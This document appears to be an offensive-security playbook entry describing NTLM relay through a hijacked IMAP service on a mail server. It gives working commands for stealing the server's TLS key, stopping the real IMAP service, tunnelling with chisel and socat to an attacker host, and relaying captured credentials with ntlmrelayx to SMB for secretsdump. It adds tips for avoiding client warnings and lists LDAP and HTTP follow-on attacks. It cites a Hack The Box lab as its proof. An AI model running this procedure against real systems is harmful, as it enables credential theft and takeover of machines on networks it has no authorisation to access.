# NTLM Relay via IMAP Service Takeover

## When to use

- A mail client (Thunderbird, Outlook) authenticates to an IMAP server via NTLM
- You can stop the real IMAP service and start a rogue one on the same port
- The mail client auto-reconnects with NTLM credentials
- Goal: capture and relay NTLM authentication to another service (SMB, LDAP, HTTP)

## Tags

- ATT&CK: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay), T1187 (Forced Authentication)
- Platform: Windows, Linux (relay infrastructure)
- Services: IMAP (TCP 143/993), SMB, LDAP
- Privileges: admin on the mail server (to stop real IMAP + bind to port)

## How it works

Mail clients configured with NTLM authentication periodically reconnect to IMAP and
re-authenticate. By stopping the real IMAP service and starting an ntlmrelayx IMAP
listener on the same port (using the real TLS certificate for trust), the next client
connection sends NTLM credentials that can be relayed to any target.

## Prerequisites

- Root/admin on the mail server (to stop the IMAP service and bind to port 143/993)
- The real TLS certificate and private key (for trusted IMAP TLS)
- Network path from the mail server to the relay target
- ntlmrelayx with IMAP server support

## Steps

### 1. Copy the real TLS certificate

```bash
# Grommunio example
cp /etc/grommunio-common/ssl/server.crt /tmp/imap.crt
cp /etc/grommunio-common/ssl/server.key /tmp/imap.key
```

### 2. Stop the real IMAP service

```bash
# Grommunio example
grommunio-admin service stop gromox-imap
# Or: systemctl stop dovecot / cyrus-imapd / etc.
```

### 3. Set up relay infrastructure

If the relay target is on a different network (e.g., MAIL -> WS02), use SOCKS:

```bash
# Chisel SOCKS on the mail server (as root for port binding)
./chisel server -p 8888 --socks5
# On attacker: chisel client <mail>:8888 socks
```

### 4. Run ntlmrelayx with IMAP listener

```bash
# With socat forwarding IMAP to local relay
socat TCP-LISTEN:143,fork,reuseaddr TCP:<attacker>:1143 &

# On attacker
ntlmrelayx.py -t smb://<target> -smb2support \
  --imap-port 1143 --imap-cert /tmp/imap.crt --imap-key /tmp/imap.key
```

### 5. Wait for client reconnection

Mail clients typically reconnect within 1-5 minutes. The NTLM authentication
is relayed to the target service.

## Operational notes

**Use the real TLS cert.** Self-signed or mismatched certs cause TLS errors in
the mail client. The user may notice and dismiss the dialog, or the client may
refuse to connect entirely.

**Chisel must run as root.** The Go binary ignores SUID bits. Use a systemd
service unit (`/run/systemd/system/chisel.service`) to run as root if your
initial shell is a lower-privilege user.

**proxychains localnet setting.** When relaying through SOCKS, add
`localnet 127.0.0.0/255.0.0.0` to proxychains.conf so localhost connections
bypass the proxy.

**Relay targets.** SMB relay gives command execution (secretsdump, shares).
LDAP relay allows shadow credentials, RBCD, or ACL modification. HTTP relay
targets Exchange, ADFS, or web apps with NTLM auth.

## Proven on

- Grommunio IMAP -> WS02 SMB (HTB Autopilot, 2026-11): relayed stephanie.lewis NTLM to WS02:445, secretsdump recovered local admin hash + LSA cleartext password
